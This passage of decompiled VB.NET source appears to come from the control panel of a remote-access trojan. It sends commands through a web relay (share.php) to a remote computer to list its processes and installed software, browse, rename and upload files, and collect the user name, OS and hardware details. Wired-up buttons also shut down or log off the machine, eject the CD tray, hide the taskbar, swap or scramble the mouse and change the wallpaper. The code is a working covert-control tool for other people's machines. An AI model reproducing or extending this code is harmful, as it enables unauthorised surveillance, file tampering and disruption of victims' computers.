                Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                Me.f.Start
                Me.FlatStatusBar1.Text = "Directory received successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.listprocess.Items.Clear
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("Process", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_process.txt")
                Me.x = New Thread(New ThreadStart(AddressOf Me.check))
                Me.x.Start
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RefreshToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_files.txt"))
                Me.ListView1.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Getfiles|" & Me.path), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_files.txt")
                If (Me.tb_path.Text <> "") Then
                    Me.ListView1.Items.Add("[...]", &H17)
                End If
                Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                Me.f.Start
                Me.FlatStatusBar1.Text = "Directory refreshed successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RefreshToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_files.txt"))
                Me.ListView1.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Getfiles|" & Me.path), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_files.txt")
                If (Me.tb_path.Text <> "") Then
                    Me.ListView1.Items.Add("[...]", &H17)
                End If
                Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                Me.f.Start
                Me.FlatStatusBar1.Text = "Directory refreshed successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RefreshToolStripMenuItem3_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.server.delcmd(host, (file & "_files.txt"))
                Me.ListView1.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(("Getfiles|" & Me.path), host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_files.txt")
                If (Me.tb_path.Text <> "") Then
                    Me.ListView1.Items.Add("[...]", &H17)
                End If
                Me.f = New Thread(New ThreadStart(AddressOf Me.Check4))
                Me.f.Start
                Me.FlatStatusBar1.Text = "Directory refreshed successfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RenameFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "1") Then
                    Interaction.MsgBox("Please select a File!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim str3 As String = Interaction.InputBox("Please enter a new Name for the File", "Rename File", "", -1, -1)
                    If (str3 = "") Then
                        Interaction.MsgBox("Rename failed, due empty name", MsgBoxStyle.Critical, Nothing)
                    Else
                        Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                        Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "rnfile|", Me.path, Me.ListView1.SelectedItems.Item(0).Text, "|", str3 }), host, file), True, False))) Then
                            Me.FlatStatusBar1.Text = "An error occured!"
                        Else
                            Me.FlatStatusBar1.Text = "File was renamed successfully!"
                        End If
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RenameFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                If (Me.ListView1.SelectedItems.Item(0).SubItems.Item(4).Text = "0") Then
                    Interaction.MsgBox("Please select a Folder!", MsgBoxStyle.Critical, Nothing)
                Else
                    Dim str3 As String = Interaction.InputBox("Please enter a new Name for the Directory", "Rename Folder", "", -1, -1)
                    If (str3 = "") Then
                        Interaction.MsgBox("Rename failed, due empty name", MsgBoxStyle.Critical, Nothing)
                    Else
                        Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                        Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                        If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd(String.Concat(New String() { "rnfolder|", Me.path, Me.ListView1.SelectedItems.Item(0).Text, "|", str3 }), host, file), True, False))) Then
                            Me.FlatStatusBar1.Text = "An error occured!"
                        Else
                            Me.FlatStatusBar1.Text = "Directory was renamed successfully!"
                        End If
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub shareclient_UploadFileCompleted(ByVal sender As Object, ByVal e As UploadFileCompletedEventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                If Operators.ConditionalCompareObjectEqual(Me.server.sendcmd(("FileUploaded|" & Me.pathpath & "|" & Me.pathnam), host, file), True, False) Then
                    Me.FlatStatusBar1.Text = "File was successfully uploaded!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub shareclient_UploadProgressChanged(ByVal sender As Object, ByVal e As UploadProgressChangedEventArgs)
            Me.FlatStatusBar1.Text = String.Concat(New String() { Strings.Format((CDbl(e.BytesSent) / 1024), "#0.0"), " KB/", Strings.Format((CDbl(e.TotalBytesToSend) / 1024), "#0.0"), " KB (", e.ProgressPercentage.ToString, "%)" })
        End Sub

        Private Sub tb_path_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs)
            If (e.KeyCode = Keys.Enter) Then
                Me.PictureBox1_Click(RuntimeHelpers.GetObjectValue(New Object), New EventArgs)
            End If
        End Sub

        Private Sub ToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Dim str3 As String = Conversions.ToString(Me.server.getlogs(host, file, "_system"))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(0).Text = ("Computer Name: " & str3.Split(New Char() { "|"c })(0))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(1).Text = ("User Name: " & str3.Split(New Char() { "|"c })(1))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(2).Text = ("Virtual Screen Width: " & str3.Split(New Char() { "|"c })(2))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(3).Text = ("Virtual Screen Height: " & str3.Split(New Char() { "|"c })(3))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(4).Text = ("Available Physical Memory: " & str3.Split(New Char() { "|"c })(4))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(5).Text = ("Available Virtual Memory: " & str3.Split(New Char() { "|"c })(5))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(6).Text = ("OS Full Name: " & str3.Split(New Char() { "|"c })(6))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(7).Text = ("OS Platform: " & str3.Split(New Char() { "|"c })(7))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(8).Text = ("OS Version: " & str3.Split(New Char() { "|"c })(8))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(9).Text = ("Total Physical Memory: " & str3.Split(New Char() { "|"c })(9))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(10).Text = ("Total Virtual Memory: " & str3.Split(New Char() { "|"c })(10))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(11).Text = ("Battery Charge Status: " & str3.Split(New Char() { "|"c })(11))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(12).Text = ("Battery Full Lifetime: " & str3.Split(New Char() { "|"c })(12))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(13).Text = ("Battery Life Percent: " & str3.Split(New Char() { "|"c })(13))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(14).Text = ("Battery Life Remaining: " & str3.Split(New Char() { "|"c })(14))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(15).Text = ("CPU Info: " & str3.Split(New Char() { "|"c })(15))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(&H10).Text = ("GPU Name: " & str3.Split(New Char() { "|"c })(&H10))
                Me.TreeView1.Nodes.Item(0).Nodes.Item(&H11).Text = ("Uptime: " & str3.Split(New Char() { "|"c })(&H11))
                Me.FlatStatusBar1.Text = "Computer Info received succesfully!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub ToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim host As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim file As String = Me.connected.Split(New Char() { "|"c })(1)
                Me.ListBox_Software.Items.Clear
                If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.server.sendcmd("GetInstalledSoftware", host, file), True, False))) Then
                    Me.FlatStatusBar1.Text = "An error occured!"
                End If
                Me.url = (host & "/" & file & "_isoft.txt")
                Me.s = New Thread(New ThreadStart(AddressOf Me.check2))
                Me.s.Start
                Me.FlatStatusBar1.Text = "Installed Software-list received!"
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An error occured!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub UploadFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim dialog As New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.InitialDirectory = Environment.GetFolderPath(SpecialFolder.Desktop).ToString
                dialog2.Multiselect = False
                dialog2.Title = "Select a File to be uploaded!"
                dialog2 = Nothing
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.pathpath = Me.path
                    Me.shareclient.UploadFileAsync(New Uri((str & "/share.php")), dialog.FileName)
                    Me.pathnam = dialog.FileName.Split(New Char() { "\"c })(MyProject.Forms.Form1.CountCharacter(dialog.FileName, "\"c))
                Else
                    Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub UploadFileToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim dialog As New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.InitialDirectory = Environment.GetFolderPath(SpecialFolder.Desktop).ToString
                dialog2.Multiselect = False
                dialog2.Title = "Select a File to be uploaded!"
                dialog2 = Nothing
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.pathpath = Me.path
                    Me.shareclient.UploadFileAsync(New Uri((str & "/share.php")), dialog.FileName)
                    Me.pathnam = dialog.FileName.Split(New Char() { "\"c })(MyProject.Forms.Form1.CountCharacter(dialog.FileName, "\"c))
                Else
                    Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub UploadFileToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str As String = Me.connected.Split(New Char() { "|"c })(0)
                Dim dialog As New OpenFileDialog
                Dim dialog2 As OpenFileDialog = dialog
                dialog2.InitialDirectory = Environment.GetFolderPath(SpecialFolder.Desktop).ToString
                dialog2.Multiselect = False
                dialog2.Title = "Select a File to be uploaded!"
                dialog2 = Nothing
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.pathpath = (Me.path & Me.ListView1.SelectedItems.Item(0).Text & "\")
                    Me.shareclient.UploadFileAsync(New Uri((str & "/share.php")), dialog.FileName)
                    Me.pathnam = dialog.FileName.Split(New Char() { "\"c })(MyProject.Forms.Form1.CountCharacter(dialog.FileName, "\"c))
                Else
                    Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.FlatStatusBar1.Text = "An Error occured by uploading the File!"
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub Write(ByVal txt As String)
            Try 
                Dim box As New TextBox With { _
                    .Text = txt _
                }
                Dim str2 As String
                For Each str2 In box.Lines
                    Dim strArray As String() = str2.Split(New Char() { "|"c })
                    Dim text As String = strArray(0)
                    Dim str3 As String = strArray(1)
                    Dim str4 As String = strArray(2)
                    Dim str5 As String = strArray(3)
                    Dim str6 As String = strArray(4)
                    Dim item As New ListViewItem([text])
                    item.SubItems.Add(str3)
                    item.SubItems.Add(str4)
                    item.SubItems.Add(str5)
                    item.SubItems.Add(str6)
                    Me.listprocess.Items.AddRange(New ListViewItem() { item })
                Next
                Me.FlatStatusBar1.Text = "Process-list received successfully! "
                Me.FlatStatusBarprocess.Text = ("Total Processes: " & Conversions.ToString(Me.listprocess.Items.Count))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub


        ' Properties
        Friend Overridable Property btn_changewp As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_changewp
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_changewp_Click)
                If (Not Me._btn_changewp Is Nothing) Then
                    RemoveHandler Me._btn_changewp.Click, handler
                End If
                Me._btn_changewp = value
                If (Not Me._btn_changewp Is Nothing) Then
                    AddHandler Me._btn_changewp.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_closecd As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_closecd
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_closecd_Click)
                If (Not Me._btn_closecd Is Nothing) Then
                    RemoveHandler Me._btn_closecd.Click, handler
                End If
                Me._btn_closecd = value
                If (Not Me._btn_closecd Is Nothing) Then
                    AddHandler Me._btn_closecd.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_hidedi As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_hidedi
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_hidedi_Click)
                If (Not Me._btn_hidedi Is Nothing) Then
                    RemoveHandler Me._btn_hidedi.Click, handler
                End If
                Me._btn_hidedi = value
                If (Not Me._btn_hidedi Is Nothing) Then
                    AddHandler Me._btn_hidedi.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_hidetb As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_hidetb
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_hidetb_Click)
                If (Not Me._btn_hidetb Is Nothing) Then
                    RemoveHandler Me._btn_hidetb.Click, handler
                End If
                Me._btn_hidetb = value
                If (Not Me._btn_hidetb Is Nothing) Then
                    AddHandler Me._btn_hidetb.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_logoff As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_logoff
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_logoff_Click)
                If (Not Me._btn_logoff Is Nothing) Then
                    RemoveHandler Me._btn_logoff.Click, handler
                End If
                Me._btn_logoff = value
                If (Not Me._btn_logoff Is Nothing) Then
                    AddHandler Me._btn_logoff.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_opencd As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_opencd
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_opencd_Click)
                If (Not Me._btn_opencd Is Nothing) Then
                    RemoveHandler Me._btn_opencd.Click, handler
                End If
                Me._btn_opencd = value
                If (Not Me._btn_opencd Is Nothing) Then
                    AddHandler Me._btn_opencd.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_openweb As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_openweb
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_openweb_Click)
                If (Not Me._btn_openweb Is Nothing) Then
                    RemoveHandler Me._btn_openweb.Click, handler
                End If
                Me._btn_openweb = value
                If (Not Me._btn_openweb Is Nothing) Then
                    AddHandler Me._btn_openweb.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_restart As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_restart
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_restart_Click)
                If (Not Me._btn_restart Is Nothing) Then
                    RemoveHandler Me._btn_restart.Click, handler
                End If
                Me._btn_restart = value
                If (Not Me._btn_restart Is Nothing) Then
                    AddHandler Me._btn_restart.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_send As FlatStickyButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_send
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStickyButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_send_Click)
                If (Not Me._btn_send Is Nothing) Then
                    RemoveHandler Me._btn_send.Click, handler
                End If
                Me._btn_send = value
                If (Not Me._btn_send Is Nothing) Then
                    AddHandler Me._btn_send.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_showdi As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_showdi
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_showdi_Click)
                If (Not Me._btn_showdi Is Nothing) Then
                    RemoveHandler Me._btn_showdi.Click, handler
                End If
                Me._btn_showdi = value
                If (Not Me._btn_showdi Is Nothing) Then
                    AddHandler Me._btn_showdi.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_showtb As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_showtb
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_showtb_Click)
                If (Not Me._btn_showtb Is Nothing) Then
                    RemoveHandler Me._btn_showtb.Click, handler
                End If
                Me._btn_showtb = value
                If (Not Me._btn_showtb Is Nothing) Then
                    AddHandler Me._btn_showtb.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_shutdown As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_shutdown
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_shutdown_Click)
                If (Not Me._btn_shutdown Is Nothing) Then
                    RemoveHandler Me._btn_shutdown.Click, handler
                End If
                Me._btn_shutdown = value
                If (Not Me._btn_shutdown Is Nothing) Then
                    AddHandler Me._btn_shutdown.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_speak As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_speak
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_speak_Click)
                If (Not Me._btn_speak Is Nothing) Then
                    RemoveHandler Me._btn_speak.Click, handler
                End If
                Me._btn_speak = value
                If (Not Me._btn_speak Is Nothing) Then
                    AddHandler Me._btn_speak.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_startdiscomouse As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_startdiscomouse
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_startdiscomouse_Click)
                If (Not Me._btn_startdiscomouse Is Nothing) Then
                    RemoveHandler Me._btn_startdiscomouse.Click, handler
                End If
                Me._btn_startdiscomouse = value
                If (Not Me._btn_startdiscomouse Is Nothing) Then
                    AddHandler Me._btn_startdiscomouse.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_stopdiscomouse As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_stopdiscomouse
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_stopdiscomouse_Click)
                If (Not Me._btn_stopdiscomouse Is Nothing) Then
                    RemoveHandler Me._btn_stopdiscomouse.Click, handler
                End If
                Me._btn_stopdiscomouse = value
                If (Not Me._btn_stopdiscomouse Is Nothing) Then
                    AddHandler Me._btn_stopdiscomouse.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_swap As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_swap
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_swap_Click)
                If (Not Me._btn_swap Is Nothing) Then
                    RemoveHandler Me._btn_swap.Click, handler
                End If
                Me._btn_swap = value
                If (Not Me._btn_swap Is Nothing) Then
                    AddHandler Me._btn_swap.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_test As FlatStickyButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_test
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStickyButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_test_Click)
                If (Not Me._btn_test Is Nothing) Then
                    RemoveHandler Me._btn_test.Click, handler
                End If
                Me._btn_test = value
                If (Not Me._btn_test Is Nothing) Then
                    AddHandler Me._btn_test.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property btn_undo As FlatButton
            <DebuggerNonUserCode> _
            Get
                Return Me._btn_undo
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.btn_undo_Click)
                If (Not Me._btn_undo Is Nothing) Then
                    RemoveHandler Me._btn_undo.Click, handler
                End If
                Me._btn_undo = value
                If (Not Me._btn_undo Is Nothing) Then
                    AddHandler Me._btn_undo.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_drive As FlatComboBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_drive
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatComboBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.cb_drive_SelectedIndexChanged)
                Dim handler2 As EventHandler = New EventHandler(AddressOf Me.cb_drive_Click)
                If (Not Me._cb_drive Is Nothing) Then
                    RemoveHandler Me._cb_drive.SelectedIndexChanged, handler
                    RemoveHandler Me._cb_drive.Click, handler2
                End If
                Me._cb_drive = value
                If (Not Me._cb_drive Is Nothing) Then
                    AddHandler Me._cb_drive.SelectedIndexChanged, handler
                    AddHandler Me._cb_drive.Click, handler2
                End If
            End Set
        End Property

        Friend Overridable Property ColumnHeader1 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader1 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader10 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader10 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader2 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader2 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader3 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader3 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader4 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader4 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader5 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader5 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader6 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader6 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader7 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader7 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader8 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader8 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader9 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader9 = value
            End Set
        End Property

        Friend Overridable Property ComboBox1 As FlatComboBox
            <DebuggerNonUserCode> _
            Get
                Return Me._ComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatComboBox)
                Me._ComboBox1 = value
            End Set
        End Property

        Friend Overridable Property ComboBox2 As FlatComboBox
            <DebuggerNonUserCode> _
            Get
                Return Me._ComboBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatComboBox)
                Me._ComboBox2 = value
            End Set
        End Property

        Friend Overridable Property CopyFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CopyFileToolStripMenuItem
            End Get
